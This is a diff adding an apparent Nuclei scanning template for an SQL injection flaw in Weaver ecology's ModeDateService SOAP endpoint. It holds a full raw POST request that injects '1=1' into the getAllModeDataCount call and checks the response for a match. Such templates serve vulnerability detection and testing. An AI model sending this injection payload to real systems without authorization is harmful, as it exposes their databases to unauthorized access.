@@ -1,0 +1,56 @@
+id: WeaverE-cology-ModeDateService-sql
+
+info:
+  name: 泛微ecology ModeDateService 存在SQL注⼊漏洞
+  author: zyt
+  severity: high
+
+
+
+http:
+  - raw:
+      - |          
+        POST /services/ModeDateService HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Referer: http://127.0.0.1/services/ 
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ecology_JSessionid=aaasJ-HspHcxI5r2Krufz; JSESSIONID=aaasJ-HspHcxI5r2Krufz
+        Connection: close
+        SOAPAction:
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 405
+        
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
+          <soapenv:Header/>   <soapenv:Body>
+            <mod:getAllModeDataCount>
+              <mod:in0>
+                1
+              </mod:in0>
+              <mod:in1>
+              1
+              </mod:in1>
+              <mod:in2>
+              1=1
+              </mod:in2>
+              <mod:in3>
+              1
+              </mod:in3>
+            </mod:getAllModeDataCount>
+          </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ns1:out"
+      - type: status
+        status: 
+          - 200
+
+ 
